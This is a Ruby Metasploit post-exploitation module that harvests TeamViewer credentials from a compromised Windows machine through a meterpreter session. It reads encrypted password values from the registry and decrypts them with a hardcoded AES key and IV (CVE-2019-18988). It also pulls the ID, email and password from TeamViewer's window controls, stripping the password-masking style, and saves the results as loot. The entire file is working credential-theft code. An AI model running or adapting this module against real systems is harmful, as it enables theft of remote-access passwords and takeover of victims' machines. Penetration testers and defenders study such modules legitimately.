##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather TeamViewer Passwords',
        'Description' => %q{ This module will find and decrypt stored TeamViewer passwords },
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2019-18988'], [ 'URL', 'https://whynotsecurity.com/blog/teamviewer/'],
          [ 'URL', 'https://www.cnblogs.com/Kali-Team/p/12468066.html' ]
        ],
        'Author' => [ 'Nic Losby <blurbdust[at]gmail.com>', 'Kali-Team <kali-team[at]qq.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
    register_options(
      [
        OptString.new('WINDOW_TITLE', [ false, 'Specify a title for getting the window handle, e.g. TeamViewer', 'TeamViewer']),
      ]
    )
  end

  def app_list
    results = ''
    keys = [
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version8', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version9', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version10', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version11', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version12', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version13', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version14', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version15', 'Version' ],
      [ 'HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer', 'Version' ],
      [ 'HKLM\\SOFTWARE\\TeamViewer\\Temp', 'SecurityPasswordExported' ],
      [ 'HKLM\\SOFTWARE\\TeamViewer', 'Version' ],
    ]

    locations = [
      { value: 'OptionsPasswordAES', description: 'Options Password' },
      { value: 'SecurityPasswordAES', description: 'Unattended Password' }, # for < v9.x
      { value: 'SecurityPasswordExported', description: 'Exported Unattended Password' },
      { value: 'ServerPasswordAES', description: 'Backend Server Password' }, # unused according to TeamViewer
      { value: 'ProxyPasswordAES', description: 'Proxy Password' },
      { value: 'LicenseKeyAES', description: 'Perpetual License Key' }, # for <= v14
    ]

    keys.each do |parent_key, _child_key|
      locations.each do |location|
        secret = registry_getvaldata(parent_key, location[:value])
        next if secret.nil?

        plaintext = decrypt(secret)
        next if plaintext.nil?

        print_good("Found #{location[:description]}: #{plaintext}")
        results << "#{location[:description]}: #{plaintext}\n"
        store_valid_credential(
          user: nil,
          private: plaintext,
          private_type: :password,
          service_data: {
            address: session.session_host,
            last_attempted_at: nil,
            origin_type: :session,
            port: 5938, # https://community.teamviewer.com/t5/Knowledge-Base/Which-ports-are-used-by-TeamViewer/ta-p/4139
            post_reference_name: refname,
            protocol: 'tcp',
            service_name: 'teamviewer',
            session_id: session_db_id,
            status: Metasploit::Model::Login::Status::UNTRIED
          }
        )
      end
    end

    # Only save data to disk when there's something in the table
    unless results.empty?
      path = store_loot('host.teamviewer_passwords', 'text/plain', session, results, 'teamviewer_passwords.txt', 'TeamViewer Passwords')
      print_good("Passwords stored in: #{path}")
    end
  end

  def decrypt(encrypted_data)
    password = ''
    return password unless encrypted_data

    password = ''

    key = "\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
    iv = "\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
    aes = OpenSSL::Cipher.new('AES-128-CBC')
    begin
      aes.decrypt
      aes.key = key
      aes.iv = iv
      plaintext = aes.update(encrypted_data)
      password = Rex::Text.to_ascii(plaintext, 'utf-16le')
      if plaintext.empty?
        return nil
      end
    rescue OpenSSL::Cipher::CipherError => e
      print_error("Unable to decrypt the data. Exception: #{e}")
    end

    password
  end

  def get_window_text(window_hwnd)
    if window_hwnd
      addr = session.railgun.util.alloc_and_write_wstring('Kali-Team')
      client.railgun.user32.SendMessageW(window_hwnd, 'WM_GETTEXT', 1024, addr)
      text = session.railgun.util.read_wstring(addr)
      client.railgun.multi([
        ['kernel32', 'VirtualFree', [addr, 0, MEM_RELEASE]],
      ])
      if text.strip == ''
        return nil
      else
        return text
      end
    else
      return nil
    end
  end

  # EnumWindows Function not work in RailGun, I don't know how to define the lpEnumFunc parameter
  def enum_id_and_password(hwnd_main)
    hwnd_mwrcp = client.railgun.user32.FindWindowExW(hwnd_main, nil, 'MainWindowRemoteControlPage', nil)
    hwnd_irccv = client.railgun.user32.FindWindowExW(hwnd_mwrcp['return'], nil, 'IncomingRemoteControlComponentView', nil)
    hwnd_custom_runner_id = client.railgun.user32.FindWindowExW(hwnd_irccv['return'], nil, 'CustomRunner', nil)
    hwnd_custom_runner_pass = client.railgun.user32.FindWindowExW(hwnd_irccv['return'], hwnd_custom_runner_id['return'], 'CustomRunner', nil)
    #  find edit box handle
    hwnd_id_edit_box = client.railgun.user32.FindWindowExW(hwnd_custom_runner_id['return'], nil, 'Edit', nil)
    print_status("Found handle to ID edit box 0x#{hwnd_id_edit_box['return'].to_s(16).rjust(8, '0')}")
    hwnd_pass_edit_box = client.railgun.user32.FindWindowExW(hwnd_custom_runner_pass['return'], nil, 'Edit', nil)
    print_status("Found handle to Password edit box 0x#{hwnd_pass_edit_box['return'].to_s(16).rjust(8, '0')}")
    #  get window text
    if hwnd_id_edit_box['return'] && hwnd_pass_edit_box['return']
      print_good("ID: #{get_window_text(hwnd_id_edit_box['return'])}")
      print_good("PASSWORD: #{get_window_text(hwnd_pass_edit_box['return'])}")
    else
      print_error('Handle for TeamViewer ID or password edit box not found')
    end
  end

  def enum_email_and_password(hwnd_main)
    hwnd_lp = client.railgun.user32.FindWindowExW(hwnd_main, nil, 'LoginPage', nil)
    hwnd_lfv = client.railgun.user32.FindWindowExW(hwnd_lp['return'], nil, 'LoginFormView', nil)
    #  find edit box handle
    hwnd_email_edit_box = client.railgun.user32.FindWindowExW(hwnd_lfv['return'], nil, 'Edit', nil)
    print_status("Found handle to Email edit box 0x#{hwnd_email_edit_box['return'].to_s(16).rjust(8, '0')}")
    hwnd_pass_edit_box = client.railgun.user32.FindWindowExW(hwnd_lfv['return'], hwnd_email_edit_box['return'], 'Edit', nil)
    print_status("Found handle to Password edit box 0x#{hwnd_pass_edit_box['return'].to_s(16).rjust(8, '0')}")
    #  Remove ES_PASSWORD style
    #  https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowlongw
    #  https://docs.microsoft.com/en-us/windows/win32/controls/edit-control-styles
    #  GWL_STYLE  -16
    client.railgun.user32.SetWindowWord(hwnd_pass_edit_box['return'], -16, 0)
    #  get window text
    email_text = get_window_text(hwnd_email_edit_box['return'])
    pass_text = get_window_text(hwnd_pass_edit_box['return'])
    if email_text
      print_good("EMAIL: #{email_text}")
    else
      print_error('Handle for TeamViewer ID or Password edit box not found')
    end
    if pass_text
      print_good("PASSWORD: #{pass_text}")
    else
      print_error('No password in Password edit box')
    end
  end

  def run
    print_status("Finding TeamViewer Passwords on #{sysinfo['Computer']}")
    app_list

    print_status('<---------------- | Using Window Technique | ---------------->')
    parent_key = 'HKEY_CURRENT_USER\\Software\\TeamViewer'
    language = registry_getvaldata(parent_key, 'SelectedLanguage')
    version = registry_getvaldata(parent_key, 'IntroscreenShownVersion')
    print_status("TeamViewer's language setting options are '#{language}'")
    print_status("TeamViewer's version is '#{version}'")
    hwnd = client.railgun.user32.FindWindowW('#32770', datastore['WINDOW_TITLE'])['return']

    #  Try to get window handle through registry
    if !hwnd
      hwnd = registry_getvaldata(parent_key, 'MainWindowHandle')
    end
    if hwnd != 0
      print_good("TeamViewer's  title is '#{get_window_text(hwnd)}'")
      enum_id_and_password(hwnd)
      enum_email_and_password(hwnd)
    else
      if !session.sys.process.each_process.find { |i| i['name'].downcase == 'TeamViewer.exe'.downcase }
        print_error('Unable to find TeamViewer\'s process')
        return false
      end
      print_error('Unable to find TeamViewer\'s window. Try to set window title')
      return false
    end
  end
end
